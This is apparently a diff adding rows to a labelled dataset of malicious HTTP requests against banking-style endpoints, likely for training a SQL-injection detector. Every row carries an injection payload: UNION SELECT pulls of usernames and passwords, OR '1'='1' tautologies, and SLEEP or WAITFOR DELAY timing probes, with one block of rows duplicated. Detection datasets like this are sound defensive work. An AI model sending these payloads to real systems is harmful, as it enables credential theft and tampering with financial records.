+"PUT /payment/update HTTP/1.1\nContent-Type: application/json\npayment_id=112233' UNION SELECT null, username, password FROM users --&amount=1200",1
+PUT /funds/modify HTTP/1.1\nContent-Type: application/json\naccount_id=12121' AND '1'='1' --&amount=500,1
+"PUT /user/profile HTTP/1.1\nContent-Type: application/json\nuser_id=98765' UNION SELECT null, username, password FROM users --&email=newemail@example.com",1
+PUT /loan/modify HTTP/1.1\nContent-Type: application/json\nloan_id=4321' AND '1'='1' --&amount=15000,1
+"PUT /card/update HTTP/1.1\nContent-Type: application/json\ncard_id=999' UNION SELECT null, username, password FROM users --&expiry_date=12/24",1
+PUT /transaction/status HTTP/1.1\nContent-Type: application/json\ntransaction_id=2222' AND '1'='1' --&status=completed,1
+PUT /payment/modify HTTP/1.1\nContent-Type: application/json\npayment_id=4567' AND '1'='1' --&status=failed,1
+"PUT /account/modify HTTP/1.1\nContent-Type: application/json\naccount_id=67890' UNION SELECT null, username, password FROM users --&account_type=savings",1
+PUT /user/modify HTTP/1.1\nContent-Type: application/json\nuser_id=1122' AND '1'='1' --&password=newpassword,1
+"PUT /loan/approve HTTP/1.1\nContent-Type: application/json\nloan_id=888' UNION SELECT null, username, password FROM users --&approved=true",1
+PUT /funds/update HTTP/1.1\nContent-Type: application/json\naccount_id=54321' AND '1'='1' --&amount=2500,1
+"PUT /card/modify HTTP/1.1\nContent-Type: application/json\ncard_id=321' UNION SELECT null, username, password FROM users --&expiry_date=09/25",1
+PUT /account/status HTTP/1.1\nContent-Type: application/json\naccount_id=5678' AND '1'='1' --&status=active,1
+DELETE /account/remove HTTP/1.1\nContent-Type: application/json\naccount_id=1001' OR '1'='1' --&confirm=true,1
+"DELETE /payment/delete HTTP/1.1\nContent-Type: application/json\npayment_id=555' UNION SELECT null, username, password FROM users --&reason=fraud",1
+DELETE /user/deactivate HTTP/1.1\nContent-Type: application/json\nuser_id=2222' AND '1'='1' --&confirm=true,1
+DELETE /transaction/cancel HTTP/1.1\nContent-Type: application/json\ntransaction_id=10000' OR '1'='1' --&reason=duplicate,1
+"DELETE /loan/cancel HTTP/1.1\nContent-Type: application/json\nloan_id=5555' UNION SELECT null, username, password FROM users --&reason=change_of_plan",1
+DELETE /funds/withdraw HTTP/1.1\nContent-Type: application/json\naccount_id=1111' AND '1'='1' --&reason=wrong_amount,1
+"DELETE /account/close HTTP/1.1\nContent-Type: application/json\naccount_id=6666' UNION SELECT null, username, password FROM users --&confirm=true",1
+DELETE /card/remove HTTP/1.1\nContent-Type: application/json\ncard_id=7777' AND '1'='1' --&reason=lost,1
+"DELETE /transaction/delete HTTP/1.1\nContent-Type: application/json\ntransaction_id=8888' UNION SELECT null, username, password FROM users --&reason=error",1
+DELETE /payment/cancel HTTP/1.1\nContent-Type: application/json\npayment_ref=4321' AND '1'='1' --&reason=duplicate,1
+"DELETE /loan/terminate HTTP/1.1\nContent-Type: application/json\nloan_id=2345' UNION SELECT null, username, password FROM users --&reason=paid_off",1
+DELETE /user/remove HTTP/1.1\nContent-Type: application/json\nuser_id=9999' AND '1'='1' --&confirm=true,1
+"DELETE /transaction/revert HTTP/1.1\nContent-Type: application/json\ntransaction_id=1010' UNION SELECT null, username, password FROM users --&reason=system_error",1
+DELETE /account/deactivate HTTP/1.1\nContent-Type: application/json\naccount_id=555' AND '1'='1' --&reason=inactive,1
+"DELETE /payment/verify HTTP/1.1\nContent-Type: application/json\npayment_id=12345' UNION SELECT null, username, password FROM users --&reason=error",1
+DELETE /user/delete HTTP/1.1\nContent-Type: application/json\nuser_id=444' AND '1'='1' --&reason=close_account,1
+"DELETE /funds/remove HTTP/1.1\nContent-Type: application/json\nfund_id=888' UNION SELECT null, username, password FROM users --&reason=withdrawal_error",1
+DELETE /loan/close HTTP/1.1\nContent-Type: application/json\nloan_id=999' AND '1'='1' --&reason=fully_paid,1
+"DELETE /card/cancel HTTP/1.1\nContent-Type: application/json\ncard_id=333' UNION SELECT null, username, password FROM users --&reason=theft",1
+DELETE /transaction/rollback HTTP/1.1\nContent-Type: application/json\ntransaction_id=777' AND '1'='1' --&reason=double_entry,1
+DELETE /account/remove HTTP/1.1\nContent-Type: application/json\naccount_id=1001' OR '1'='1' --&confirm=true,1
+"DELETE /payment/delete HTTP/1.1\nContent-Type: application/json\npayment_id=555' UNION SELECT null, username, password FROM users --&reason=fraud",1
+DELETE /user/deactivate HTTP/1.1\nContent-Type: application/json\nuser_id=2222' AND '1'='1' --&confirm=true,1
+DELETE /transaction/cancel HTTP/1.1\nContent-Type: application/json\ntransaction_id=10000' OR '1'='1' --&reason=duplicate,1
+"DELETE /loan/cancel HTTP/1.1\nContent-Type: application/json\nloan_id=5555' UNION SELECT null, username, password FROM users --&reason=change_of_plan",1
+DELETE /funds/withdraw HTTP/1.1\nContent-Type: application/json\naccount_id=1111' AND '1'='1' --&reason=wrong_amount,1
+"DELETE /account/close HTTP/1.1\nContent-Type: application/json\naccount_id=6666' UNION SELECT null, username, password FROM users --&confirm=true",1
+DELETE /card/remove HTTP/1.1\nContent-Type: application/json\ncard_id=7777' AND '1'='1' --&reason=lost,1
+"DELETE /transaction/delete HTTP/1.1\nContent-Type: application/json\ntransaction_id=8888' UNION SELECT null, username, password FROM users --&reason=error",1
+DELETE /payment/cancel HTTP/1.1\nContent-Type: application/json\npayment_ref=4321' AND '1'='1' --&reason=duplicate,1
+"DELETE /loan/terminate HTTP/1.1\nContent-Type: application/json\nloan_id=2345' UNION SELECT null, username, password FROM users --&reason=paid_off",1
+DELETE /user/remove HTTP/1.1\nContent-Type: application/json\nuser_id=9999' AND '1'='1' --&confirm=true,1
+"DELETE /transaction/revert HTTP/1.1\nContent-Type: application/json\ntransaction_id=1010' UNION SELECT null, username, password FROM users --&reason=system_error",1
+DELETE /account/deactivate HTTP/1.1\nContent-Type: application/json\naccount_id=555' AND '1'='1' --&reason=inactive,1
+"DELETE /payment/verify HTTP/1.1\nContent-Type: application/json\npayment_id=12345' UNION SELECT null, username, password FROM users --&reason=error",1
+DELETE /user/delete HTTP/1.1\nContent-Type: application/json\nuser_id=444' AND '1'='1' --&reason=close_account,1
+"DELETE /funds/remove HTTP/1.1\nContent-Type: application/json\nfund_id=888' UNION SELECT null, username, password FROM users --&reason=withdrawal_error",1
+DELETE /loan/close HTTP/1.1\nContent-Type: application/json\nloan_id=999' AND '1'='1' --&reason=fully_paid,1
+"DELETE /card/cancel HTTP/1.1\nContent-Type: application/json\ncard_id=333' UNION SELECT null, username, password FROM users --&reason=theft",1
+DELETE /transaction/rollback HTTP/1.1\nContent-Type: application/json\ntransaction_id=777' AND '1'='1' --&reason=double_entry,1
+POST /user/login HTTP/1.1\nContent-Type: application/json\nusername=admin' AND SLEEP(5) --&password=pass123,1
+POST /account/transfer HTTP/1.1\nContent-Type: application/json\nfrom_account=12345' AND 1=1 WAITFOR DELAY '0:0:5' --&to_account=67890&amount=1000,1
+POST /transaction/initiate HTTP/1.1\nContent-Type: application/json\nfrom_account=67890' AND SLEEP(5) --&to_account=11111&amount=1000,1
+POST /user/reset_password HTTP/1.1\nContent-Type: application/json\nuser_id=1001' AND 1=1 WAITFOR DELAY '0:0:5' --&new_password=newpass123,1
+POST /loan/apply HTTP/1.1\nContent-Type: application/json\nloan_id=555' AND SLEEP(5) --&amount=15000&term=12,1
+POST /account/update HTTP/1.1\nContent-Type: application/json\naccount_id=2222' AND 1=1 WAITFOR DELAY '0:0:5' --&balance=5000,1
+POST /payment/verify HTTP/1.1\nContent-Type: application/json\npayment_ref=7890' AND SLEEP(5) --&amount=1000,1
+POST /transaction/verify HTTP/1.1\nContent-Type: application/json\ntransaction_id=1234' AND 1=1 WAITFOR DELAY '0:0:5' --&status=completed,1
+POST /funds/transfer HTTP/1.1\nContent-Type: application/json\nfrom_account=10000' AND 1=1 WAITFOR DELAY '0:0:5' --&to_account=99999&amount=2000,1
+POST /loan/modify HTTP/1.1\nContent-Type: application/json\nloan_id=1234' AND 1=1 WAITFOR DELAY '0:0:5' --&amount=10000,1
+POST /payment/cancel HTTP/1.1\nContent-Type: application/json\npayment_id=888' AND SLEEP(5) --&reason=fraud,1
+POST /transaction/cancel HTTP/1.1\nContent-Type: application/json\ntransaction_id=5678' AND SLEEP(5) --&reason=duplicate,1
+POST /card/update HTTP/1.1\nContent-Type: application/json\ncard_id=3333' AND 1=1 WAITFOR DELAY '0:0:5' --&expiry_date=12/23,1
+POST /user/update HTTP/1.1\nContent-Type: application/json\nuser_id=789' AND SLEEP(5) --&email=newemail@example.com,1
+POST /account/overview HTTP/1.1\nContent-Type: application/json\naccount_id=5555' AND 1=1 WAITFOR DELAY '0:0:5' --&balance=1000,1
+POST /loan/status HTTP/1.1\nContent-Type: application/json\nloan_id=7777' AND SLEEP(5) --&status=approved,1
+POST /payment/update HTTP/1.1\nContent-Type: application/json\npayment_id=4444' AND SLEEP(5) --&status=completed,1
+POST /transaction/update HTTP/1.1\nContent-Type: application/json\ntransaction_id=8888' AND SLEEP(5) --&status=failed,1
+POST /funds/withdraw HTTP/1.1\nContent-Type: application/json\naccount_id=123' AND SLEEP(5) --&amount=500,1
+POST /loan/approve HTTP/1.1\nContent-Type: application/json\nloan_id=2222' AND SLEEP(5) --&approved=true,1
+POST /user/login HTTP/1.1\nContent-Type: application/json\nusername=admin' AND 1=1 WAITFOR DELAY '0:0:5' --&password=password,1
+POST /transaction/revert HTTP/1.1\nContent-Type: application/json\ntransaction_id=777' AND 1=1 WAITFOR DELAY '0:0:5' --&status=reverted,1
+POST /account/deposit HTTP/1.1\nContent-Type: application/json\naccount_id=2222' AND SLEEP(5) --&amount=5000,1
+POST /payment/revert HTTP/1.1\nContent-Type: application/json\npayment_id=3333' AND SLEEP(5) --&status=error,1
+GET /user/login?username=admin' OR '1'='1' -- HTTP/1.1,1
+GET /account/overview?account_id=1001' OR '1'='1' -- HTTP/1.1,1
+GET /transaction/details?transaction_id=1234' OR '1'='1' -- HTTP/1.1,1
+GET /loan/apply?loan_id=555' OR '1'='1' -- HTTP/1.1,1
+GET /user/profile?user_id=999' OR '1'='1' -- HTTP/1.1,1
+GET /payment/status?payment_ref=333' OR '1'='1' -- HTTP/1.1,1
+GET /funds/transfer?from_account=111' OR '1'='1' -- HTTP/1.1,1
+GET /transaction/history?account_id=888' OR '1'='1' -- HTTP/1.1,1
+GET /loan/details?loan_id=777' OR '1'='1' -- HTTP/1.1,1
+GET /account/statement?account_id=666' OR '1'='1' -- HTTP/1.1,1
+GET /user/reset_password?user_id=444' OR '1'='1' -- HTTP/1.1,1
+GET /payment/update?payment_id=222' OR '1'='1' -- HTTP/1.1,1
+GET /loan/status?loan_id=555' OR '1'='1' -- HTTP/1.1,1
+GET /card/update?card_id=999' OR '1'='1' -- HTTP/1.1,1
+GET /transaction/cancel?transaction_id=111' OR '1'='1' -- HTTP/1.1,1
+GET /account/modify?account_id=222' OR '1'='1' -- HTTP/1.1,1
+GET /user/logout?user_id=555' OR '1'='1' -- HTTP/1.1,1
+GET /payment/verify?payment_ref=3333' OR '1'='1' -- HTTP/1.1,1
+GET /loan/approve?loan_id=4444' OR '1'='1' -- HTTP/1.1,1
+GET /funds/withdraw?account_id=1111' OR '1'='1' -- HTTP/1.1,1
+POST /user/login HTTP/1.1\nContent-Type: application/json\nusername=admin' OR '1'='1' --&password=password123,1
+POST /account/transfer HTTP/1.1\nContent-Type: application/json\nfrom_account=1234' OR '1'='1' --&to_account=6789&amount=1000,1
+POST /loan/apply HTTP/1.1\nContent-Type: application/json\nloan_id=555' OR '1'='1' --&amount=15000&term=12,1
+POST /user/reset_password HTTP/1.1\nContent-Type: application/json\nuser_id=12345' OR '1'='1' --&new_password=newpassword,1
+POST /transaction/initiate HTTP/1.1\nContent-Type: application/json\nfrom_account=111' OR '1'='1' --&to_account=222&amount=500,1
+POST /payment/verify HTTP/1.1\nContent-Type: application/json\npayment_ref=6789' OR '1'='1' --&amount=2000,1
+POST /funds/transfer HTTP/1.1\nContent-Type: application/json\nfrom_account=100' OR '1'='1' --&to_account=200&amount=500,1
+POST /user/login HTTP/1.1\nContent-Type: application/json\nusername=admin' OR '1'='1' --&password=adminpassword,1
+POST /loan/approve HTTP/1.1\nContent-Type: application/json\nloan_id=3333' OR '1'='1' --&approved=true,1
+POST /transaction/cancel HTTP/1.1\nContent-Type: application/json\ntransaction_id=5555' OR '1'='1' --&reason=error,1
+POST /payment/update HTTP/1.1\nContent-Type: application/json\npayment_id=4444' OR '1'='1' --&status=completed,1
+POST /card/update HTTP/1.1\nContent-Type: application/json\ncard_id=1234' OR '1'='1' --&expiry_date=12/23,1
+POST /user/profile HTTP/1.1\nContent-Type: application/json\nuser_id=5678' OR '1'='1' --&email=admin@example.com,1
+POST /account/update HTTP/1.1\nContent-Type: application/json\naccount_id=9999' OR '1'='1' --&balance=2000,1
+POST /payment/verify HTTP/1.1\nContent-Type: application/json\npayment_ref=7890' OR '1'='1' --&amount=1500,1
+POST /loan/details HTTP/1.1\nContent-Type: application/json\nloan_id=1111' OR '1'='1' --&status=approved,1
+POST /funds/withdraw HTTP/1.1\nContent-Type: application/json\naccount_id=4444' OR '1'='1' --&amount=500,1
+POST /transaction/update HTTP/1.1\nContent-Type: application/json\ntransaction_id=2222' OR '1'='1' --&status=completed,1
+POST /loan/status HTTP/1.1\nContent-Type: application/json\nloan_id=7777' OR '1'='1' --&status=repaid,1
+POST /account/overview HTTP/1.1\nContent-Type: application/json\naccount_id=666' OR '1'='1' --&balance=500,1
